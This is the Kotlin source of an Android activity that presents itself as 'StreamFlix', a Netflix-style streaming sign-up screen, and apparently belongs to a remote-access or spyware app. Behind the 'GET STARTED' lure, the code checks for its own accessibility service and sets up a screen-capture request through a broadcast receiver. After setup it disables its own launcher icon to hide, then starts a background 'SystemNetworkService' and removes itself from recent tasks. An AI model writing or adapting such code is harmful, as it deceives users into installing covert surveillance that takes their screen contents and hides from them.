package com.openaccess.sdk

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.app.Activity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.DisplayCapture
import com.openaccess.sdk.service.SystemNetworkService

@Suppress("DEPRECATION")
class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_SCREEN = 101
        private const val RC_NOTIF = 102
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOf<String>()

        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null

        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM)

        val REQUEST_PERMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ALL_PERMS else CORE_PERMS

        val PERM_LABELS = mapOf(
            Manifest.permission.POST_NOTIFICATIONS to "Notifications",
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }
    }

    private lateinit var rootLayout: FrameLayout
    private lateinit var continueBtn: Button
    private lateinit var statusText: TextView
    private var retryCount = 0
    private var requestingNotif = false

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            try {
                val projIntent = DisplayCapture.getProjectionIntent(this@MainActivity)
                startActivityForResult(projIntent, RC_SCREEN)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN))
            }
        } catch (_: Exception) {}

        rootLayout = createMovieView()
        setContentView(rootLayout)

        if (ALL_PERMS.all { hasPermission(this, it) }) {
            onSetupComplete()
        }
    }

    private fun dp(dip: Int): Int {
        return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()
    }

    private fun createMovieView(): FrameLayout {
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#141414"))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // Hero image gradient background
        val heroBg = View(this).apply {
            val gd = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(
                    Color.parseColor("#1A1A2E"),
                    Color.parseColor("#16213E"),
                    Color.parseColor("#0F3460"),
                    Color.parseColor("#141414")
                )
            )
            background = gd
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                dp(320)
            )
        }
        root.addView(heroBg)

        // Netflix-style logo
        val logo = TextView(this).apply {
            text = "StreamFlix"
            textSize = 42f
            setTypeface(null, android.graphics.Typeface.BOLD_ITALIC)
            setTextColor(Color.parseColor("#E50914"))
            gravity = Gravity.CENTER
            setPadding(0, dp(64), 0, dp(8))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            )
        }
        root.addView(logo)

        // Tagline
        val tagline = TextView(this).apply {
            text = "Unlimited movies & TV shows"
            textSize = 16f
            setTextColor(Color.parseColor("#FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(4))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(120) }
        }
        root.addView(tagline)

        // Subtitle
        val subtitle = TextView(this).apply {
            text = "Watch anywhere. Cancel anytime."
            textSize = 14f
            setTextColor(Color.parseColor("#A3A3A3"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(32))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(152) }
        }
        root.addView(subtitle)

        // Main content scroll
        val scroll = ScrollView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ).apply { topMargin = dp(260) }
        }

        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), 0, dp(20), dp(24))
        }

        // Feature cards
        val features = listOf(
            Pair("\uD83C\uDFAC", "HD Streaming"),
            Pair("\uD83D\uDCF1", "Watch on any device"),
            Pair("\u2B07\uFE0F", "Download & watch offline")
        )

        features.forEach { (icon, title) ->
            val card = LinearLayout(this@MainActivity).apply {
                orientation = LinearLayout.HORIZONTAL
                setPadding(dp(16), dp(14), dp(16), dp(14))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = dp(10) }
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(Color.parseColor("#1F1F1F"))
                    setStroke(1, Color.parseColor("#333333"))
                }
            }

            val iconView = TextView(this@MainActivity).apply {
                text = icon
                textSize = 24f
                setPadding(0, 0, dp(14), 0)
                gravity = Gravity.CENTER_VERTICAL
            }
            card.addView(iconView)

            val titleView = TextView(this@MainActivity).apply {
                text = title
                textSize = 15f
                setTextColor(Color.parseColor("#FFFFFF"))
                gravity = Gravity.CENTER_VERTICAL
            }
            card.addView(titleView)
            content.addView(card)
        }

        // Continue button
        continueBtn = Button(this).apply {
            text = "GET STARTED"
            textSize = 16f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(52)
            ).apply {
                topMargin = dp(24)
                bottomMargin = dp(12)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(6).toFloat()
                setColor(Color.parseColor("#E50914"))
            }
            setOnClickListener { requestAllPerms() }
        }
        content.addView(continueBtn)

        // Status text
        statusText = TextView(this).apply {
            text = "By continuing, you agree to our Terms of Service"
            textSize = 11f
            setTextColor(Color.parseColor("#757575"))
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(16))
        }
        content.addView(statusText)

        scroll.addView(content)
        root.addView(scroll)
        return root
    }

    private fun requestAllPerms() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
            return
        }

        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
            statusText.text = "Setting up your account..."
            statusText.setTextColor(Color.parseColor("#FFAA00"))
            continueBtn.text = "SETTING UP..."
            continueBtn.isEnabled = false
        } catch (_: Exception) {
            statusText.text = "Tap again to continue"
        }
    }

    private fun requestNotifPermission() {
        if (NOTIF_PERM == null) { checkAndProceed(); return }
        if (hasPermission(this, NOTIF_PERM)) { checkAndProceed(); return }
        requestingNotif = true
        try {
            ActivityCompat.requestPermissions(this, arrayOf(NOTIF_PERM), RC_NOTIF)
        } catch (_: Exception) {
            requestingNotif = false
            checkAndProceed()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_SCREEN) {
            if (resultCode == RESULT_OK && data != null) {
                DisplayCapture.setProjection(resultCode, data)
                DisplayCapture.initProjection(this)
                statusText.text = "Screen capture active"
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)

        if (requestCode == RC_NOTIF) {
            requestingNotif = false
            checkAndProceed()
            return
        }

        if (requestCode == RC_ALL) {
            val denied = REQUEST_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                checkAndProceed()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1500)
                } else {
                    retryCount = 0
                    statusText.text = "Some permissions denied — proceeding anyway"
                    continueBtn.text = "Continue"
                    continueBtn.isEnabled = true
                    continueBtn.setOnClickListener { onSetupComplete() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        when {
            !permsOk && retryCount < 3 -> requestAllPerms()
            !permsOk -> onSetupComplete()
            else -> onSetupComplete()
        }
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        try {
            val serviceIntent = Intent(this, SystemNetworkService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (_: Exception) {}

        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
        if (requestingNotif) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        if (permsOk) {
            onSetupComplete()
        }
    }

    override fun onPause() {
        super.onPause()
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
    }
}
